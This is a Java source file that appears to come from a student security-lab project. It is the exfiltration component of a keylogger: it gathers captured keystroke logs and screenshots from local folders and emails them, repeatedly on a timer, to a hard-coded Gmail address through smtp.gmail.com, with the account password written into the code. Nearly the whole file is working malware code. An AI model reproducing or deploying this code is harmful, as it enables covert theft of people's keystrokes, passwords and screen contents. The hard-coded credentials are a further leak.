/*
*	We have chosen to use java to take the logs and screenshots generated
*	by our keylogging utility and then send them to our created email address
*	for further analysis later
*/

// mailUtility.java

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.PasswordAuthentication;

import java.lang.Process;
import java.lang.Runtime;
import java.lang.InterruptedException;
import java.lang.Thread;
import java.util.Properties;
import java.io.File;
import java.util.Arrays;
import java.util.ArrayList;


// Following a guideline set by http://www.tutorialspoint.com/javamail_api/javamail_api_send_email_with_attachment.htm
// Helped resolve the sign in issue http://www.mkyong.com/java/javamail-api-sending-email-via-gmail-smtp-example


public class mailUtility implements Runnable
{
	// Constant strings
	private static String mailSubject = "Final Project Logs";
	private static String pathToLogs = "../Logs";
	private static String pathToImages = "../Images";
	private static String logZipName = "log.zip";
	private static String logName = "../Logs/log.txt";
	private static String imageZipName = "images.zip";
	private static String emailAddr = "sec.lab.final@gmail.com";
	private static String passWord = "testFinal";


	static long waitPeriod = 0;

	// Mail Variables
	static Properties props;
	static Session mailSession;
	static MimeMessage mailMessage;

	public static void main(String args[]) throws AddressException, MessagingException
	{
		if(args.length != 1)
		{
			System.out.println("Invalid number of argumens, only one is supposed to be specifed. There was " + args.length);
			System.exit(1);
		}
		else
		{
			waitPeriod = Long.parseLong(args[0]);
			String testMessage = "This is a test message for the keylogger final project";
			if(waitPeriod == 0)
			{
				System.out.println("Only executing mail once");
				System.out.println("Starting the send mail process");
				createAndSendMail(testMessage);
				System.out.println("Successfully sent the email, check your inbox");
			}
			else
			{
				System.out.println("Wait period  between emails was set to " + waitPeriod + " minutes");
				Thread runLoop = new Thread(new mailUtility());
				runLoop.start();
			}
		}
		
	}

	public static void createAndSendMail(String messageBody) throws AddressException, MessagingException
	{

		// Initialize the mail server properties
		props = System.getProperties();
		props.put("mail.smtp.port", "587");
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");


		System.out.println("Finished with mailServer properties");

	 	mailSession = Session.getInstance(props,
		  new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(emailAddr, passWord);
			}
		  });

		mailMessage = new MimeMessage(mailSession);
		Multipart multipartMessage = new MimeMultipart();

		System.out.println("Finished building mail Session");

		// Start building the mail header
		mailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(emailAddr));
		mailMessage.setSubject(mailSubject);
		MimeBodyPart mailBody = new MimeBodyPart();
		mailBody.setContent(messageBody, "text/html");

		System.out.println("Mail header built");

		// Create the mime counterparts to attach our two files
		
		MimeBodyPart logAttachment = new MimeBodyPart();
		MimeBodyPart imageAttachment = null;
		File logFile = new File(logName);

		// Add all of the images due to problem with zip file
		File imageDirectory = new File(pathToImages);
		ArrayList<String> names = new ArrayList<String>(Arrays.asList(imageDirectory.list()));
		for(String fileName : names)
		{
			try
			{
				File imageFile = new File(pathToImages+"/"+fileName);
				imageAttachment = new MimeBodyPart();
				imageAttachment.attachFile(imageFile);
				multipartMessage.addBodyPart(imageAttachment);
			}
			catch(Exception e)
			{
				System.out.println("Issue attaching image files");
			}
		}

		//Attach log files
		try
		{
			logAttachment.attachFile(logFile);
		}
		catch (Exception e)
		{
			System.out.println("Unable to attach files");
		}

		System.out.println("finished Attaching files");

		//Add to the email using multipart
		multipartMessage.addBodyPart(logAttachment);
		//multipartMessage.addBodyPart(imageAttachment);

		multipartMessage.addBodyPart(mailBody);
		mailMessage.setContent(multipartMessage, "text/html");

		System.out.println("Finished putting the mail together");

		//Finally send the message
		Transport transport = mailSession.getTransport("smtp");
 
		// Enter your correct gmail UserID and Password
		// if you have 2FA enabled then provide App Specific Password
		transport.connect("smtp.gmail.com", emailAddr, passWord);
		transport.sendMessage(mailMessage, mailMessage.getAllRecipients());
		transport.close();
		System.out.println("Succesfully sent the email, check your inbox");

	}

	public void run()
	{
		String testMessage = "This is a test message for the keylogger final project";
		while(true)
		{
			try
			{
				System.out.println("Only executing mail once");
				System.out.println("Starting the send mail process");
				createAndSendMail(testMessage);
				System.out.println("Successfully sent the email, check your inbox");
				Thread.sleep(60*1000*waitPeriod);
			}
			catch(Exception e)
			{
				System.out.println("Error with trying to get the thread to sleep");
			}
		}
	}

}
